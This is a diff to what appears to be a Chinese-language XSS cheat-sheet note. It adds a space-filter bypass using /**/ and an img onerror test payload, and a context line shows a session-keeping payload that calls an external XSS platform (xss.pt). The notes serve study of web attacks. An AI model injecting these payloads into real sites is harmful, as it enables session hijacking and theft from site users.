@@ -57,7 +57,20 @@ if(''==1){keep=new Image();keep.src='https://xss.pt/xss.php?do=keepsession&id=Sh
 
 > **window.onload()** 方法用于在网页加载完毕后立刻执行的操作，即当 HTML 文档加载完毕后，立刻执行某个方法。
 
+#### 空格过滤
+
+换成`/**/`
+
+#### 其他
+
+```html
+<img src="s" onerror=alert('xss')></img>
+```
+
+
 
 ## 参考
 
 [1] [XSS平台的使用](http://zhuabapa.top/2019/12/25/XSS%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/)
+
+[2] []()
